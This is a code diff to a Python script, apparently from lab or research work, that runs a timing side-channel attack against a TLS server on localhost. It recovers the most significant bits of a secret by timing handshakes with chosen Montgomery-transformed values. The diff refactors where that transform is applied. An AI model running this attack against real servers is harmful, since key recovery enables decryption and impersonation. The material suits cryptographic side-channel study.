@@ -86,19 +86,24 @@ def reverse_montegomery_transform(g, N):
     return u_g
 
 
-def sample(points, num_samples):
+def sample(points, sample_size=7, u_g=False, N=None):
     samples = []
 
     gc.disable()
 
     for point in points:
-        for iteration in range(num_samples):
+        for iteration in range(sample_size):
             gc.collect()
 
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect(("localhost", 443))
 
-            start_time, response, end_time = tls.handshake_attack(sock, g=point)
+            if u_g and N:
+                point_to_send = reverse_montegomery_transform(point, N)
+            else:
+                point_to_send = point
+
+            start_time, response, end_time = tls.handshake_attack(sock, g=point_to_send)
             samples.append((point, end_time - start_time))
 
             sock.close()
@@ -112,10 +117,7 @@ def bruteforce_most_significant_bits(
     num_bits=3,
     min_point=sympy.sympify("2**511"),
     max_point=sympy.sympify("2**512"),
-    sample_size=7,
     neighbourhood_size=400,
-    reverse_montegomery_transform=False,
-    N=None,
 ):
     msb = []
     for i in range(2 ** num_bits):
@@ -133,9 +135,6 @@ def bruteforce_most_significant_bits(
 
     for g in gs.copy():
         gs += [g + i for i in range(1, neighbourhood_size)]
-
-    if reverse_montegomery_transform and N:
-        gs = [reverse_montegomery_transform(g, N) for g in gs]
 
     return gs
 
